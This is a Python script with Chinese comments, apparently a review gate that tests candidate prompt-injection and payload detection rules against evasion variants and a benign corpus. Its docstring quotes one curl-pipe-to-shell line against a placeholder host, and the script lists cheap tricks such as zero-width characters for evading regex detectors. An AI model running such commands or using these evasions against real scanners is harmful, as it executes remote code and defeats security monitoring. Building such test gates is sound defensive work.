#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""对抗式候选规则评审（candidate promotion gate）。

背景
----
2026-09-18 评审的 4 条 skill 指令载荷候选（scanner/_proposed/PROPOSED_20260918_
skill_md_instruction_payload__c84a4b.json）全部以 status=rejected 退场，证据有三：

1. 7/7 条引用上下文良性样本被命中 —— 语料只有 13 条时 fp=0 是**语料盲点**，
   不是规则特异性；BENIGN_CORPUS 扩到 20 条后闸门才看得见。
2. R1 解释器家族 0/6 覆盖率（只认 sh 家族，python 家族全漏）。
3. 零宽字符可平凡逃逸（`curl\u200b http://a.b/c | sh` 不命中）。

这三条**都是可以在写规则之前就知道的**。本脚本把这三类检查固化成门禁，
候选在晋升前必须先过：

* 变异族不得逃逸 —— 零宽字符 / 大小写 / 空白 / 换行·制表符管道 / 代码围栏 /
  CRLF。某族逃逸而原始样本命中，即候选对该逃逸家族有缺口，拒绝晋升。
* 良性负控不得新出 critical —— 引用抑制是引用场景的兜底，候选在良性语料上
  命中 critical/high 即视为引用抑制挡不住。
* 命中集不得被现有规则包含 —— 子集规则没有独立覆盖价值，等于给误报加一条副本。

用法
----
    python scripts/adversarial_review.py                      # 默认评审目标文件
    python scripts/adversarial_review.py --candidates <file>  # 指定候选文件
    python scripts/adversarial_review.py --json               # 机器可读输出
    python scripts/adversarial_review.py --strict             # WARN 也视为失败

退出码
------
    0 = 全过（含 WARN）
    1 = 至少一个 FAIL 或（--strict）至少一个 WARN

零外部依赖：仅标准库 + 本仓 scanner/ 与 scripts/rule_corpus.py。
"""
import argparse
import glob
import importlib
import json
import os
import re
import sys
from typing import Any, Dict, List, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

# 默认评审对象：本轮被拒的 skill 指令载荷候选。
# 文件移到 shadow-refused/ 后用 glob 兜底，两种位置都认。
DEFAULT_TARGETS = [
    os.path.join(ROOT, "scanner", "_proposed",
                 "PROPOSED_20260918_skill_md_instruction_payload__c84a4b.json"),
    os.path.join(ROOT, "scanner", "_proposed", "shadow-refused", "*.json"),
]


# ---------------------------------------------------------------------------
# 变异族
# ---------------------------------------------------------------------------
# 每条候选都要过这几族。逃逸的定义是：原始样本命中，但某族变异后不命中。
# 族与族的区别是"攻击者需要付出的代价"，全部代价都很低（复制粘贴级）。

ZWSP = "\u200b"      # 零宽空格 —— markdown 渲染不可见，攻击者复制粘贴即可插入
NBSP = "\u00a0"      # 不换行空格 —— 视觉上等同空格，\s 不匹配

# 零宽字符插入位置：优先落在字母之间（不赌 `\s` 是否匹配 U+200B）。
# 位置取「分隔符之后的第 2、4、6 个字符」，命中 curl / http / sh 等关键字内部。
ZW_INSERT_AT = (2, 4, 6)


def _variant_case(text: str) -> str:
    """全大写：检验 `(?i)` 缺失。

    `(?i)\bjailbreak\b` 与 `\\bjailbreak\\b` 在样本上结果相同，
    但全大写变体下后者必然漏检 —— 攻击者改大小写是零成本动作。
    """
    return text.upper()


def _variant_ws(text: str) -> str:
    """空白膨胀为 5 空格：检验 `\\s+` 与硬编码 `\\s` / 空格交替。

    同时保留 `\b` 语义：`sh` 前后仍是空白，词边界不变。
    """
    return re.sub(r"\s+", "     ", text)


def _variant_tabs(text: str) -> str:
    """空白替换为制表符：检验 `\\s` 与空格交替写法（` \\s? ` 之类）。"""
    return re.sub(r"[ \t]+", "\t", text)


def _variant_nlpipes(text: str) -> List[str]:
    """管道两端各折行。

    返回多条：单行折行（无换行前后缀）、多行折行。多行版用来暴露
    `analyze()` 逐行扫描的固有缺口 —— 这是引擎行为不是候选缺陷，
    报告中单独标注，不作为拒绝理由（否则任何跨行规则都必挂）。
    """
    single = text.replace("|", "|\n")
    multi = "## 示例\n\n" + text.replace("|", "\n|\n") + "\n\n以上仅为说明。"
    return [single, multi]


def _variant_zw(text: str) -> str:
    """零宽空格注入分隔符之后的固定位置。"""
    out = []
    for part in re.split(r"([|;>&])", text):
        if re.fullmatch(r"[|;>&]", part or ""):
            base = part
            tail = ""
        else:
            base, tail = part[:1], part[1:]
        for i in ZW_INSERT_AT:
            if 1 <= i <= len(tail):
                tail = tail[:i] + ZWSP + tail[i:]
        out.append(base + tail)
    return "".join(out)


def _variant_nbsp(text: str) -> str:
    """普通空格替换为不换行空格：检验 `\\s` 是否覆盖 U+00A0（它不覆盖）。"""
    return text.replace(" ", NBSP)


def _variant_fence(text: str) -> str:
    """代码围栏包裹。

    检验两件事：(a) 围栏文本不干扰规则命中；(b) 围栏说明文字里若含
    元语言标记（detects / sample / threat model 等），引用抑制会否把真实
    载荷误降级。返回 (变体, 是否含元语言标记)。
    """
    meta_line = "以下载荷用于检测规则开发，供测试使用。"
    fenced = ("# Skill examples\n\n" + meta_line + "\n\n```bash\n"
              + text + "\n```\n")
    return fenced


def _variant_crlf(text: str) -> str:
    """CRLF 行尾：检验正则是否被隐式依赖 LF（`$` / `\\M` / `\\Z` 语义）。"""
    return text.replace("\n", "\r\n")


def _inject_token(sample: str, token: str) -> List[str]:
    """把载荷片段注入到中性前缀之后。

    直接命中正样本集太容易通过，注入版才是「规则能不能泛化」的真实考验。
    """
    out = []
    for prefix in ("请执行：", "step 2:", "TODO: ", "注意："):
        out.append(prefix + " " + sample + " " + token + " 收尾")
    return out


# ---------------------------------------------------------------------------
# 评审主体
# ---------------------------------------------------------------------------
def _load_static_patterns() -> Dict[str, str]:
    """取现有（静态 + 技能附加）规则，用于候选命中集冗余判定。

    刻意不含 generated / radar：情报与雷达规则本来就在同一评审通道里，
    拿它们当基准会让候选自己给自己背书。
    """
    r = importlib.import_module("scanner.rules")
    out: Dict[str, str] = {}
    for name in (["SANDBOX_RULES", "ZH_PROMPT_INJECTION_RULES"]
                 + ["MCP%02d_RULES" % i for i in range(1, 11)]
                 + ["ASI%02d_RULES" % i for i in range(1, 11)]):
        store = getattr(r, name, None)
        if isinstance(store, dict):
            for p in store:
                if isinstance(p, str):
                    out[p] = name
    skill = getattr(r, "SKILL_EXTRA_RULES", None)
    if isinstance(skill, dict):
        for p in skill:
            if isinstance(p, str):
                out[p] = "SKILL_EXTRA_RULES"
    return out


def _hit_ids(pattern: str, samples: Dict[str, str]) -> List[str]:
    """返回样本中命中该正则的 id 列表。"""
    try:
        rx = re.compile(pattern)
    except re.error:
        return []
    return [sid for sid, txt in samples.items() if rx.search(txt)]


def _compile_ok(pattern: str) -> Tuple[bool, str]:
    try:
        re.compile(pattern)
        return True, ""
    except re.error as exc:
        return False, str(exc)


def _benign_findings(pattern: str) -> List[Dict[str, Any]]:
    """候选规则对良性语料的命中（经引用抑制后的真实结果，全部严重级别）。

    与 audit_rules.py 同一口径：逐条样本单独成文件，路径落 /skills/ 下，
    使 is_doc 降级不生效 —— 这是引用场景误报真正危害所在的位置。

    同时返回抑制前的原始命中数（suppressed），因为「被降级」与「未命中」
    是两回事：前者说明规则确实命中了防御文档，只是靠兜底救了它。
    """
    from rule_corpus import BENIGN_CORPUS
    rules_mod = importlib.import_module("scanner.rules")
    probe = {"skills/probe_adv.md": pattern}
    rules_mod.RADAR_RULES = dict(rules_mod.RADAR_RULES, **probe)
    try:
        files = {"skills/benign_%02d.md" % i: t for i, t in enumerate(BENIGN_CORPUS)}
        result = rules_mod.analyze(files, "mcp")
    finally:
        del rules_mod.RADAR_RULES["skills/probe_adv.md"]
    hits = []
    for f in result["findings"]:
        hits.append({
            "severity": f.get("severity"),
            "file": f.get("file"),
            "description": f.get("description"),
            "evidence": (f.get("evidence") or "")[:120],
            "citation_context": bool(f.get("citation_context")),
        })
    return hits


def review_candidate(cand: Dict[str, Any], seq: int,
                     static_patterns: Dict[str, str]) -> Dict[str, Any]:
    """评审单条候选，返回结构化结论。"""
    idx = cand.get("id", seq)
    pattern = cand.get("pattern", "")
    samples = dict(cand.get("attack_samples") or {})
    res: Dict[str, Any] = {
        "idx": idx,
        "pattern": pattern,
        "severity": cand.get("severity"),
        "description": cand.get("description"),
        "attack_samples": len(samples),
        "base_hits": 0,
        "mutations": {},
        "generalization": {"variants": 0, "hits": 0},
        "benign_critical_high": 0,
        "redundant_with": None,
        "fails": [],
        "warns": [],
        "verdict": "pass",
    }

    ok, err = _compile_ok(pattern)
    if not ok:
        res["fails"].append("正则不可编译: %s" % err)
        res["verdict"] = "fail"
        return res

    ids = list(samples)
    base = _hit_ids(pattern, samples)
    res["base_hits"] = len(base)
    res["base_sample_ids"] = base
    if not ids:
        res["fails"].append("候选未附正样本，无法判定效果")
        res["verdict"] = "fail"
        return res
    if not base:
        res["fails"].append("正样本集 0 命中 —— 规则对自述场景完全失效")

    # --- (?i) 缺失探测 -----------------------------------------------------
    # 大小写逃逸的常见根因不是 \b 或空白，而是根本没写 (?i)。
    # 直接给出加 (?i) 后的命中数，把修复方向说清楚。
    has_i = bool(re.match(r"^\(\?i\)", pattern)) or "(?i)" in pattern[:16]
    fixed = pattern if has_i else "(?i)" + pattern
    fixed_hits = _hit_ids(fixed, samples) if ok else []
    res["case_flag"] = {"has_ia": has_i,
                        "hits_base": len(base),
                        "hits_with_ia": len(fixed_hits)}
    if not has_i and len(fixed_hits) > len(base):
        res["fails"].append(
            "缺少 (?i)：加 (?i) 后正样本命中 %d→%d（大小写逃逸根因）"
            % (len(base), len(fixed_hits)))

    if not ids:
        res["verdict"] = "fail"
        return res

    # --- 变异族 -------------------------------------------------------------
    probes: Dict[str, List[str]] = {
        "case_upper": [_variant_case(s) for s in samples.values()],
        "whitespace_expand": [_variant_ws(s) for s in samples.values()],
        "tabs": [_variant_tabs(s) for s in samples.values()],
        "newline_pipe": [],
        "zero_width": [_variant_zw(s) for s in samples.values()],
        "nbsp": [_variant_nbsp(s) for s in samples.values()],
        "code_fence": [_variant_fence(s) for s in samples.values()],
        "crlf": [_variant_crlf(s) for s in samples.values()],
    }
    for s in samples.values():
        probes["newline_pipe"].extend(_variant_nlpipes(s))

    for fam, texts in probes.items():
        # 折叠后必须仍是被扫描的正文（逐行扫描的引擎要求样本以文本形式存在）
        text = "\n".join(t for t in texts if t)
        hit = len(_hit_ids(pattern, {"adv_%s" % fam: text})) > 0
        res["mutations"][fam] = {
            "variants": len(texts),
            "hits": hit,
            "escaped": bool(base) and not hit,
        }
        if hit:
            continue
        # 基线本身 0 命中时，逐族逃逸没有独立信息量——「0 命中」这一条已经
        # 完整描述了失效，重复列 8 族只会把真正的问题稀释掉。
        if not base:
            continue
        if fam == "newline_pipe":
            # 跨行逃逸是 analyze() 逐行扫描的固有缺口，不是单条候选的缺陷；
            # 记录但不作为拒绝理由，否则所有跨行规则都必挂。
            res["warns"].append(
                "%s 族逃逸（%d 变体）——属引擎逐行扫描固有缺口，非本候选缺陷"
                % (fam, len(texts)))
            continue
        res["fails"].append(
            "%s 族逃逸（%d 变体全未命中）" % (fam, len(texts)))

    # --- 良性负控（经引用抑制）---------------------------------------------
    bc_all = _benign_findings(pattern)
    bc = [h for h in bc_all if h["severity"] in ("critical", "high")]
    res["benign_critical_high"] = len(bc)
    res["benign_total"] = len(bc_all)
    res["benign_suppressed"] = sum(1 for h in bc_all
                                    if h["citation_context"]
                                    and h["severity"] not in ("critical", "high"))
    res["benign_findings"] = bc
    if bc:
        res["fails"].append(
            "良性语料出现 %d 条 critical/high 误报 —— 引用抑制挡不住" % len(bc))
    elif bc_all:
        res["warns"].append(
            "命中良性语料 %d 条、全部依赖引用抑制降级（%d 条）—— 规则本身不区分"
            "祈使式执行与文档引用，覆盖噪声高" % (len(bc_all), res["benign_suppressed"]))
    # 特异性：良性命中数不得超过正样本命中数，否则这条规则主要在打防御文档。
    if bc_all and len(bc_all) >= len(base):
        res["fails"].append(
            "良性命中 %d 条 ≥ 正样本命中 %d 条 —— 主要命中对象是防御文档"
            % (len(bc_all), len(base)))

    # --- 泛化：注入到中性前缀 ------------------------------------------------
    generic: List[str] = []
    for s in samples.values():
        generic.extend(_inject_token(s, "收尾"))
    generic_hit = len(_hit_ids(pattern, {("adv_gen_%d" % i): t
                                         for i, t in enumerate(generic)}))
    res["generalization"] = {"variants": len(generic), "hits": generic_hit}
    if base and generic_hit == 0:
        res["warns"].append("注入中性前缀后 %d 个变体全未命中 —— 规则过拟合样例"
                            % len(generic))
    elif base and generic_hit < len(base):
        res["warns"].append(
            "注入变体命中 %d < 正样本命中 %d —— 泛化弱于样例匹配"
            % (generic_hit, len(base)))


    # --- 命中集冗余 --------------------------------------------------------
    all_texts = dict(samples)
    for fam, texts in probes.items():
        all_texts["adv_%s" % fam] = "\n".join(texts)
    all_texts["adv_generalize"] = "\n".join(generic)
    cand_hits = set(_hit_ids(pattern, all_texts))
    for sp, owner in static_patterns.items():
        if cand_hits and cand_hits.issubset(set(_hit_ids(sp, all_texts))):
            res["redundant_with"] = {"owner": owner, "pattern": sp}
            res["fails"].append(
                "命中集被现有规则 %s 完全覆盖 —— 无独立覆盖价值" % owner)
            break

    if res["fails"]:
        res["verdict"] = "fail"
    elif res["warns"]:
        res["verdict"] = "warn"
    return res


def _load_candidates(paths: List[str]) -> List[Dict[str, Any]]:
    seen, loaded = set(), []
    for p in paths:
        for path in sorted(glob.glob(p)):
            if path in seen:
                continue
            seen.add(path)
            with open(path, encoding="utf-8") as fh:
                data = json.load(fh)
            data["_source_file"] = os.path.relpath(path, ROOT).replace(os.sep, "/")
            loaded.append(data)
    return loaded


def run_review(paths: List[str], strict: bool = False) -> Dict[str, Any]:
    """评审全部候选，返回汇总报告。"""
    from rule_corpus import ATTACK_SAMPLES, BENIGN_CORPUS
    static_patterns = _load_static_patterns()

    corpora: Dict[str, str] = {"as_%02d" % i: s
                               for i, s in enumerate(ATTACK_SAMPLES)}

    loaded = _load_candidates(paths)
    results = []
    seq = 0
    for data in loaded:
        for cand in data.get("rules", []) or []:
            seq += 1
            cand.setdefault("attack_samples", {})
            if not cand["attack_samples"]:
                cand["attack_samples"] = corpora
            cand.setdefault("id", "R%d" % seq)
            results.append(review_candidate(cand, seq, static_patterns))

    fails = [r for r in results if r["verdict"] == "fail"]
    warns = [r for r in results if r["verdict"] == "warn"]
    verdict = "fail" if fails else ("warn" if warns else "pass")
    return {
        "verdict": verdict,
        "files_reviewed": [d.get("_source_file") for d in loaded],
        "candidates": len(results),
        "pass": len(results) - len(fails) - len(warns),
        "warn": len(warns),
        "fail": len(fails),
        "corpus": {"attack_samples": len(ATTACK_SAMPLES),
                   "benign_corpus": len(BENIGN_CORPUS)},
        "static_baseline_rules": len(static_patterns),
        "results": results,
        "strict": strict,
        "exit_code": 1 if (fails or (strict and warns)) else 0,
    }


def _print_report(rep: Dict[str, Any]) -> None:
    print("=" * 72)
    print("AIShield 候选规则对抗式评审")
    print("=" * 72)
    print("verdict      : %s" % rep["verdict"].upper())
    print("候选         : %d（pass %d / warn %d / fail %d）"
          % (rep["candidates"], rep["pass"], rep["warn"], rep["fail"]))
    print("语料         : 正样本 %d / 良性负控 %d / 静态基线 %d 条"
          % (rep["corpus"]["attack_samples"], rep["corpus"]["benign_corpus"],
             rep["static_baseline_rules"]))
    for f in rep["files_reviewed"]:
        print("评审文件     : %s" % f)
    print()
    for r in rep["results"]:
        tag = {"pass": "PASS", "warn": "WARN", "fail": "FAIL"}[r["verdict"]]
        print("[%s] %s  %s" % (tag, r["idx"], (r["description"] or "")[:64]))
        print("      正则 : %s" % r["pattern"])
        print("      正样本 %d 条 / 命中 %d" % (r["attack_samples"], r["base_hits"]))
        esc = [k for k, v in r["mutations"].items() if v["escaped"]]
        kept = [k for k, v in r["mutations"].items() if not v["escaped"]]
        cf = r.get("case_flag") or {}
        if cf.get("has_ia") is False:
            print("      (?i)    : 缺失 —— 加 (?i) 后命中 %s→%s"
                  % (cf.get("hits_base"), cf.get("hits_with_ia")))
        print("      抗逃逸 : 通过 %d 族 %s | 逃逸 %d 族 %s"
              % (len(kept), ",".join(kept) or "-", len(esc), ",".join(esc) or "-"))
        print("      泛化   : %d/%d 注入变体命中"
              % (r["generalization"]["hits"], r["generalization"]["variants"]))
        print("      良性   : critical/high 误报 %d 条；命中良性 %d 条（引用抑制降级 %d 条）"
              % (r["benign_critical_high"], r.get("benign_total", 0),
                 r.get("benign_suppressed", 0)))
        if r["redundant_with"]:
            print("      冗余   : 命中集 ⊆ %s" % r["redundant_with"]["owner"])
        for f_ in r["fails"]:
            print("        FAIL: %s" % f_)
        for w in r["warns"]:
            print("        WARN: %s" % w)
    print()
    print("exit_code: %d" % rep["exit_code"])


def main() -> int:
    ap = argparse.ArgumentParser(description="候选规则对抗式评审门禁")
    ap.add_argument("--candidates", nargs="*", default=None,
                    help="候选 JSON 路径或 glob（默认评审 skill 指令载荷候选）")
    ap.add_argument("--json", action="store_true", help="机器可读输出")
    ap.add_argument("--strict", action="store_true", help="WARN 也视为失败")
    args = ap.parse_args()
    rep = run_review(args.candidates or DEFAULT_TARGETS, strict=args.strict)
    if args.json:
        print(json.dumps(rep, ensure_ascii=False, indent=2))
    else:
        _print_report(rep)
    return rep["exit_code"]


if __name__ == "__main__":
    sys.exit(main())
